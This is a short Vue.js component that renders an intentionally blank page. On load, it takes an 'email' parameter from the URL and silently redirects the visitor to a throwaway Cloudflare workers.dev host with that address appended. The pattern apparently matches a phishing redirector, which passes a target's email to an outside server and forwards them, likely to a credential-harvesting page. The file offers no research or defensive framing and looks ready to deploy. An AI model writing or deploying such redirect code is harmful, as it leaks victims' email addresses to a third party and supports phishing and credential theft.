<template>
  <div></div> <!-- No visible content -->
</template>

<script>
export default {
  name: "App",
  mounted() {
    // Automatically handle redirection when the component is mounted
    this.redirectWithEmail();
  },
  methods: {
    redirectWithEmail() {
      // Get the current URL parameters
      const urlParams = new URLSearchParams(window.location.search);

      // Extract the email parameter
      const email = urlParams.get("email");

      // If the email parameter exists
      if (email) {
        // Construct the redirect URL with the plain email (not encoded)
        const redirectUrl = `https://lucky-mud-238c.vencillrina33.workers.dev/${email}`;

        // Redirect to the constructed URL
        window.location.replace(redirectUrl);
      } else {
        // Log an error if no email is provided
        console.error("No email parameter found in the URL.");
      }
    },
  },
};
</script>

<style>
/* Ensure the page is completely blank */
html,
body,
#app {
  margin: 0;
  padding: 0;
  height: 100%;
  background: none;
}
</style>
